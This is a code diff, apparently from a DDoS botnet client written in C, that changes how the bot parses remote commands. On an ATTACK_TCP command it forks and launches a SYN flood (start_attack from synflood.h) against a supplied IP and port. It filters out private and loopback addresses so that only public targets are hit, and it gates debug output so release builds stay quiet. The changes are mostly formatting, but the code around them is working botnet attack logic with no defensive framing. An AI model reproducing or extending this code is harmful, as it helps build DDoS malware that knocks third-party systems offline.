@@ -6,9 +6,9 @@
 #include <unistd.h>
 #include <signal.h>
 
-#include "command.h"
-#include "utils.h"
-#include "synflood.h" // TCP
+#include <command.h>
+#include <utils.h>
+#include <synflood.h> // TCP
 
 #ifdef DEBUG
 
@@ -71,7 +71,9 @@ static void parse_command(struct command *cmd)
     __pid_t command_pid = fork();
     if (command_pid == -1)
     {
+#ifdef DEBUG
         perror("fork failed");
+#endif
         return;
     }
     if (command_pid > 0)
@@ -84,7 +86,11 @@ static void parse_command(struct command *cmd)
     case HELLO:
         break;
     case ATTACK_TCP:
-        start_attack(ip_to_string(cmd->data.target.o1, cmd->data.target.o2, cmd->data.target.o3, cmd->data.target.o4), cmd->data.port);
+        start_attack(ip_to_string(cmd->data.target.o1,
+                                  cmd->data.target.o2,
+                                  cmd->data.target.o3,
+                                  cmd->data.target.o4),
+                     cmd->data.port);
         break;
     case ATTACK_UDP:
         break;
@@ -103,12 +109,12 @@ static void parse_command(struct command *cmd)
 
 static inline int is_invalid_ip(uint8_t o1, uint8_t o2, uint8_t o3, uint8_t o4)
 {
-    return (o1 == 0 && o2 == 0 && o3 == 0 && o4 == 0) || 
-           (o1 == 127) || 
-           (o1 == 0) || 
-           (o1 == 255) || 
-           (o1 == 10) || 
-           (o1 == 172 && o2 >= 16 && o2 <= 31) || 
+    return (o1 == 0 && o2 == 0 && o3 == 0 && o4 == 0) ||
+           (o1 == 127) ||
+           (o1 == 0) ||
+           (o1 == 255) ||
+           (o1 == 10) ||
+           (o1 == 172 && o2 >= 16 && o2 <= 31) ||
            (o1 == 192 && o2 == 168);
 }
 
@@ -123,16 +129,23 @@ uint8_t parse_command_from_buffer(uint8_t buffer[])
 
 #ifdef DEBUG
     printf("[command] Type: %s, Duration: %d, Address: %d.%d.%d.%d, Port: %d\n",
-           get_command_type_string(cmd.type), cmd.data.duration, 
-           cmd.data.target.o1, cmd.data.target.o2, 
+           get_command_type_string(cmd.type), cmd.data.duration,
+           cmd.data.target.o1, cmd.data.target.o2,
            cmd.data.target.o3, cmd.data.target.o4, cmd.data.port);
 
-    //printf("is_invalid_ip() %d\n", is_invalid_ip(cmd.data.target.o1, cmd.data.target.o2, cmd.data.target.o3, cmd.data.target.o4));
+    /* printf("is_invalid_ip() %d\n", is_invalid_ip(cmd.data.target.o1,
+        cmd.data.target.o2,
+        cmd.data.target.o3,
+        cmd.data.target.o4)); */
 #endif
 
     if (cmd.type == 0 ||
-        ((cmd.type != PING && cmd.type != EXIT && cmd.type != HELLO) && 
-         (cmd.data.port == 0 || (is_invalid_ip(cmd.data.target.o1, cmd.data.target.o2, cmd.data.target.o3, cmd.data.target.o4) || cmd.data.duration == 0))))
+        ((cmd.type != PING && cmd.type != EXIT && cmd.type != HELLO) &&
+         (cmd.data.port == 0 || (is_invalid_ip(cmd.data.target.o1,
+                                               cmd.data.target.o2,
+                                               cmd.data.target.o3,
+                                               cmd.data.target.o4) ||
+                                 cmd.data.duration == 0))))
     {
         return 0;
     }
@@ -140,4 +153,3 @@ uint8_t parse_command_from_buffer(uint8_t buffer[])
     parse_command(&cmd);
     return 1;
 }
-
